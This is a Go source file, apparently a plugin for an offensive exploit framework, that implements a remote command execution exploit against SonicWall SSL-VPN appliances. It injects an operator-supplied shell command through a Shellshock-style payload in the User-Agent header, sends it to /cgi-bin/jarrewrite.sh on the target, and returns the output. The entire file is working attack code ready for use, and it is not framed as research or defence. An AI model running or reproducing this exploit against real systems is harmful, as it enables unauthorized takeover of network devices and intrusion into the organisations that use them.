package exp_sonicWall_SSLVPN

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
)

type Exp_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	headers.Set("User-Agent", fmt.Sprintf("() { :; }; echo ; /bin/bash -c '%s'", cmd))

	target := goutils.AppendUri(self.Params.BaseParam.Target, "/cgi-bin/jarrewrite.sh")

	// 发送请求
	httpresp := self.HttpGet(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_RCE{}, "exp_RCE.yml")
}
